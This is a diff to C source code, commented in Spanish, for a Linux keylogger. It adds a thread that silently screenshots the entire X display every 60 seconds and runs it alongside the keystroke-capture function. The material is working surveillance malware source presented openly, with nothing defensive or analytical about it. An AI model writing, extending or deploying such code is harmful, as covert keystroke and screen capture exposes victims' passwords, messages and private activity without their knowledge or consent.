@@ -6,9 +6,14 @@
 #include <fcntl.h>
 #include <linux/input.h>
 #include <linux/input-event-codes.h>
+#include <time.h>  // Para obtener la fecha y hora
+#include <assert.h>
+#include <pthread.h>
 
 // LIBRERIAS EXTERNAS
 #include <X11/XKBlib.h> //-lX11
+#include <cairo.h>
+#include <cairo-xlib.h>
 
 // PARA COMPILAR EL PROGRAMA:
 // gcc main.c -o main -lX11
@@ -206,7 +211,7 @@ char *getCharacter(int code)
     case KEY_TAB:
         return " [TAB] ";
     case KEY_CAPSLOCK:
-        return isCapsLockOn ? " [CAPSLOCK ON] " : " [CAPSLOCK OFF] ";
+        return " [CAPSLOCK] ";
     case KEY_BACKSPACE:
         return " [BACKSPACE] ";
     case KEY_F1:
@@ -320,7 +325,72 @@ void *keylogger()
     return NULL;
 }
 
+void* takeScreenshot(){
+    while(true){
+        Display *disp;
+        Window root;
+        cairo_surface_t *surface;
+        int scr;
+        char display_name[20] = ":0";
+        char output_file[100];
+        time_t now;
+        struct tm *local_time;
+
+        // Obtener la fecha y hora actuales
+        time(&now);
+        local_time = localtime(&now);
+        snprintf(output_file, sizeof(output_file), "image_%04d-%02d-%02d_%02d-%02d-%02d.png",
+                local_time->tm_year + 1900,
+                local_time->tm_mon + 1,
+                local_time->tm_mday,
+                local_time->tm_hour,
+                local_time->tm_min,
+                local_time->tm_sec);
+
+        /* Conectar al display especificado */
+        disp = XOpenDisplay(display_name);
+        if (disp == NULL) {
+            fprintf(stderr, "Given display cannot be found, exiting: %s\n", display_name);
+            return NULL;
+        }
+
+        scr = DefaultScreen(disp);
+        root = DefaultRootWindow(disp);
+
+        /* Obtener la superficie raíz en el display dado */
+        surface = cairo_xlib_surface_create(disp, root, DefaultVisual(disp, scr),
+                                            DisplayWidth(disp, scr),
+                                            DisplayHeight(disp, scr));
+
+        /* Guardar la imagen como PNG con la fecha y hora en el nombre */
+        cairo_surface_write_to_png(surface, output_file);
+
+        /* Liberar la memoria */
+        cairo_surface_destroy(surface);
+
+        sleep(60);
+    }
+}
+
 int main()
 {
-    keylogger();
+    pthread_t keylogger_thread, screenshot_thread;
+
+    // Crear hilo para capturar las pulsaciones de teclas
+    if (pthread_create(&keylogger_thread, NULL, keylogger, NULL) != 0) {
+        perror("Error al crear el hilo de captura de teclas");
+        return EXIT_FAILURE;
+    }
+
+    // Crear hilo para tomar capturas de pantalla
+    if (pthread_create(&screenshot_thread, NULL, takeScreenshot, NULL) != 0) {
+        perror("Error al crear el hilo de captura de pantalla");
+        return EXIT_FAILURE;
+    }
+
+    pthread_join(keylogger_thread, NULL);
+    pthread_join(screenshot_thread, NULL);
+
+    return EXIT_SUCCESS;
+
 }
